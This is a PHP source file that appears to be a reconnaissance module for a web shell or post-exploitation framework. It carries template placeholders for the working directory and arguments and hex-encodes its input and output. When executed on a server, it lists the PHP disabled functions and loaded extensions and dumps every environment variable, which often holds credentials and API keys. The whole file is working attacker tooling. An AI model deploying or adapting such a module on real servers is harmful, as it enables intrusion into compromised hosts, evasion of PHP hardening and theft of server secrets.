#<?php


class Module_webinfo
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function getDisabledFunctions()
    {
        $result = "";
        $disabled_functions = explode(',', ini_get('disable_functions'));
        foreach ($disabled_functions as $disabled_function)
        {
            $result .= $disabled_function . PHP_EOL;
        }
        return $result;
    }

    private function getLoadedExtensions()
    {
        $result = "";
        $loaded_extensions = get_loaded_extensions();
        foreach ($loaded_extensions as $loaded_extension)
        {
            $result .= $loaded_extension . PHP_EOL;
        }
        return $result;
    }

    private function getEnvironmentVariables()
    {
        $result = "";
        foreach ($_ENV as $key => $value)
        {
            $result .= $key . "='" . $value . "'" . PHP_EOL;
        }
        return $result;
    }

    private function doWebInfo()
    {
        $output = "";

        $output .= "Disabled functions" . PHP_EOL;
        $output .= "==============================" . PHP_EOL;
        $output .= $this->getDisabledFunctions();
        $output .=  PHP_EOL;

        $output .= "Loaded Extensions" . PHP_EOL;
        $output .= "==============================" . PHP_EOL;
        $output .= $this->getLoadedExtensions();
        $output .=  PHP_EOL;

        $output .= "Environment Variables" . PHP_EOL;
        $output .= "==============================" . PHP_EOL;
        $output .= $this->getEnvironmentVariables();

        return $output;
    }

    public function execute($args)
    {
        $result = "";
        $parsed_args = $this->parseArgs(hex2bin($args));
        $result = $this->doWebInfo();
        return $this->generateResponse($result);
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_webinfo($cwd);
print($module->execute($args));